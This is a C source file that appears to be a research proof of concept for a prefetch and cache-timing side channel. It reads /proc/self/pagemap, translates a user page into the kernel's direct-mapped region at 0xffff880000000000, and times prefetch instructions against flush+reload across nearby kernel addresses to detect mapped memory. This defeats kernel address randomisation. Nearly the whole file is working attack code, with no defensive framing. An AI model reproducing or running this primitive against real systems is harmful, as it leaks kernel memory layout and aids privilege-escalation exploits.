#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sched.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/mman.h>
#include "../cacheutils.h"

size_t hit_histogram[1000*1000];
size_t miss_histogram[1000*1000];

int g_pagemap_fd = -1;

#define assert(X) do { if (!(X)) { fprintf(stderr,"assertion '" #X "' failed\n"); exit(-1); } } while (0)

inline __attribute__((always_inline)) void prefetch(size_t p)
{
  asm volatile ("prefetchnta (%0)" : : "r" (p));
  asm volatile ("prefetcht2 (%0)" : : "r" (p));
}

inline __attribute__((always_inline)) uint64_t _rdtsc_begin() {
  uint64_t a, d;
  asm volatile ("mfence\n\t"
    "xor %%rax, %%rax\n\t"
    "CPUID\n\t"
    "RDTSCP\n\t"
    "mov %%rdx, %0\n\t"
    "mov %%rax, %1\n\t"
    "mfence\n\t"
    : "=r" (d), "=r" (a)
    :
    : "%rax", "%rbx", "%rcx", "%rdx");
  a = (d<<32) | a;
  return a;
}

inline __attribute__((always_inline)) uint64_t _rdtsc_end() {
  uint64_t a, d;
  asm volatile("mfence\n\t"
    "RDTSCP\n\t"
    "mov %%rdx, %0\n\t"
    "mov %%rax, %1\n\t"
    "xor %%rax, %%rax\n\t"
    "CPUID\n\t"
    "mfence\n\t"
    : "=r" (d), "=r" (a)
    :
    : "%rax", "%rbx", "%rcx", "%rdx");
  a = (d<<32) | a;
  return a;
}

void init_pagemap() {
  g_pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
  assert(g_pagemap_fd >= 0);
}

size_t get_physical_addr(void* virtual_addr_p) {
  maccess(virtual_addr_p);
  _rdtsc_begin();
  uint64_t virtual_addr = (uint64_t)virtual_addr_p;
  size_t value;
  off_t offset = (virtual_addr / 4096) * sizeof(value);
  int got = pread(g_pagemap_fd, &value, sizeof(value), offset);
  return value;
}

int get_cache_slice(uint64_t phys_addr, int bad_bit) {
  // On a 4-core machine, the CPU's hash function produces a 2-bit
  // cache slice number, where the two bits are defined by "h1" and
  // "h2":
  //
  // h1 function:
  //   static const int bits[] = { 18, 19, 21, 23, 25, 27, 29, 30, 31 };
  // h2 function:
  //   static const int bits[] = { 17, 19, 20, 21, 22, 23, 24, 26, 28, 29, 31 };
  //
  // This hash function is described in the paper "Practical Timing
  // Side Channel Attacks Against Kernel Space ASLR".
  //
  // On a 2-core machine, the CPU's hash function produces a 1-bit
  // cache slice number which appears to be the XOR of h1 and h2.

  // XOR of h1 and h2:
  static const int h0[] = { 6, 10, 12, 14, 16, 17, 18, 20, 22, 24, 25, 26, 27, 28, 30, 32, 33, 35, 36 };
  static const int h1[] = { 7, 11, 13, 15, 17, 19, 20, 21, 22, 23, 24, 26, 28, 29, 31, 33, 34, 35, 37 };

  int count = sizeof(h0) / sizeof(h0[0]);
  int hash = 0;
  for (int i = 0; i < count; i++) {
    hash ^= (phys_addr >> h0[i]) & 1;
  }
  return hash;
}

size_t in_same_cache_set(uint64_t phys1, uint64_t phys2, int bad_bit) {
  // For Sandy Bridge, the bottom 17 bits determine the cache set
  // within the cache slice (or the location within a cache line).
  uint64_t mask = ((uint64_t) 1 << 17) - 1;
  return ((phys1 & mask) == (phys2 & mask) &&
          get_cache_slice(phys1, bad_bit) == get_cache_slice(phys2, bad_bit));
}

volatile size_t* e_array;

volatile size_t* e_set[1024*1024];
size_t e_cnt = 0;
size_t e_to_evict = 0;

void evict2mtlb()
{
  if (e_cnt == 0)
  {
    e_array = (volatile size_t*)mmap(NULL, 2ull*1024*1024*1024, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    size_t e_offset = 0;
    while (e_cnt < 64)
    {
/*      size_t pte = get_physical_addr(e_array + e_offset);
      size_t offset = ((size_t)(e_array + e_offset)) & 0xFFF;
      size_t paddr = (pte << 12) | offset;
      if (in_same_cache_set(e_to_evict,paddr,-1))
      {
        e_set[e_cnt] = e_array + e_offset;
        e_cnt++;
        printf("%zu\n",e_cnt);
      }
      e_offset += 8;*/
      // 2m pages
      e_set[e_cnt] = e_array + e_offset;
      e_cnt++;
      e_offset += 262144;
    }
  }
  for (size_t i = 0; i < e_cnt; i++)
  {
    *e_set[i] += 1;
  }
}

inline __attribute__((always_inline)) size_t onlyreload(void* addr, size_t phys)
{
_rdtsc_begin();
  // Three shall be the number thou shalt count, and the number of the counting shall be three. Four shalt thou not count, neither count thou two, excepting that thou then proceed to three.
  for (size_t i = 0; i < 3; ++i)
  {
    sched_yield();
    prefetch(phys);
  }
  size_t time = _rdtsc_begin();
  maccess(addr);
  size_t delta = _rdtsc_end() - time;
  flush(addr);
  return delta;
}

inline __attribute__((always_inline)) size_t flushandreload(void* addr, size_t phys)
{
  size_t time = _rdtsc_begin();
  maccess(addr);
  size_t delta = _rdtsc_end() - time;
  flush(addr);
  return delta;
}

#define TRIES (64*1024)

pthread_t nopthread[4];

void noploop()
{
  while(1)
    asm("nop");
}

int main(int argc, char** argv)
{
  pthread_create(nopthread+0,0,noploop,0);
  pthread_create(nopthread+0,0,noploop,0);
  pthread_create(nopthread+0,0,noploop,0);
  pthread_create(nopthread+0,0,noploop,0);
  pthread_create(nopthread+0,0,noploop,0);
  pthread_create(nopthread+0,0,noploop,0);
  pthread_create(nopthread+0,0,noploop,0);
  init_pagemap();
  void* array = mmap(NULL, 1024*1024*1024, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
  void* virt = (void*)((size_t)array+2*1024*1024 >> 21 << 21);
  maccess(virt);
  size_t pte = get_physical_addr(virt);
  size_t offset = ((size_t)virt) & 0x1FFFFF;
  assert(offset == 0);
  size_t paddr = pte << 12;
  e_to_evict = paddr;
  size_t iaddr = paddr + 0xffff880000000000ull;
  printf("%16p -> %zx -> %zx -> %zx\n",virt,pte,paddr, iaddr);
  //for (size_t phys = 0xffff880000000000ull; phys < 0xffff880000000000ull + 12ull*1024*1024*1024; phys += 2*1024*1024)
  for (size_t phys = iaddr - 16*4096; phys < iaddr + 16*4096; phys += 4096)
  //for (size_t phys = 0xffff880000000000ull; phys < iaddr + 128*1024*1024; phys += 2*1024*1024)
  //size_t phys = iaddr; while (1)
  {
    memset(hit_histogram,0,1000000*sizeof(size_t));
    memset(miss_histogram,0,1000000*sizeof(size_t));
    ssize_t i = TRIES;
    size_t d = onlyreload(virt,phys);
    while (i-- > 0)
    {
      size_t d = onlyreload(virt,phys);
      if (d < 1000)
        hit_histogram[d]++;
      if (d > 250)
        continue;
      else if (d < 200)
        break;
    }
    i = 2048;
    while (i-- > 0)
    {
      size_t d = flushandreload(virt,phys);
      miss_histogram[d]++;
    }
    size_t hit_min_i = -1ULL;
    size_t miss_min_i = 12000;
    size_t hit_sum = 0;
    size_t miss_sum = 0;
    for (size_t i = 0; i < 1000000; ++i)
    {
      hit_sum += hit_histogram[i];
      miss_sum += miss_histogram[i];
      if (hit_min_i > i && hit_histogram[i] > 0)
        hit_min_i = i;
      if (miss_min_i > i && miss_histogram[i] > 0)
        miss_min_i = i;
    }
    //for (size_t i = 0; i < 400; ++i)
    //  printf("%3zu: %8zu %8zu\n",i,hit_histogram[i],miss_histogram[i]);
    printf("\n%16p,%16zx,%8zu,%8zu\n",virt,phys,hit_min_i,hit_sum);
    if (hit_min_i < 200)
      printf("\n%16p vs. %16zx%s: hit: %8zu (%8zu) miss: %8zu (%8zu)\n",virt,phys,phys == iaddr ? "*":" ",hit_min_i,hit_sum,miss_min_i,miss_sum);
    else
    {
      if (iaddr == phys)
        printf("*");
      else
        printf(".");
    }
    fflush(stdout);
    //if (hit_min_i != miss_min_i)
  }
  return 0;
}
